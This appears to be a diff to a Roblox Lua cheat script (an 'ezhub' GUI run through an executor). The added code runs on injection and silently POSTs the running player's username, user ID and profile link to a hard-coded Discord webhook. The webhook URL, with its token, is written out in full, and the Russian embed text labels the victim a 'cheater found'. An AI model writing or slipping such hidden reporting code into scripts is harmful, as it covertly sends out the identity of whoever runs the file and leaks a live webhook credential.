@@ -1,4 +1,40 @@
-
+function createEmbed()
+     local ID = game.Players.LocalPlayer.UserId
+   local NAME = game.Players.LocalPlayer.Name
+   local randcount = math.random(2, 8)
+    local url = "https://discord.com/api/webhooks/1431282360023781376/qT2E5cBFGLL_VDro-1lQnKyoebLpzTJI4eMtwwWGWOLge46e06qumsdjyOSTpk02ON3D"
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "CHITAK НАЙДЕН",
+                ["description"] = "Никнейм: "..NAME,
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["fields"] = {
+                    {
+                        ["name"] = "Ссылка на профиль: https://www.roblox.com/users/"..ID.."/profile",
+                        ["value"] = "вся информация была выдана за ~"..randcount.."секунд после инжекта.",
+                    }
+                },
+                ["thumbnail"] = {
+                    ["url"] = "",
+                },
+                ["footer"] = {
+                    ["text"] = "made by millertoz"
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+createEmbed()
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ezhub"
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
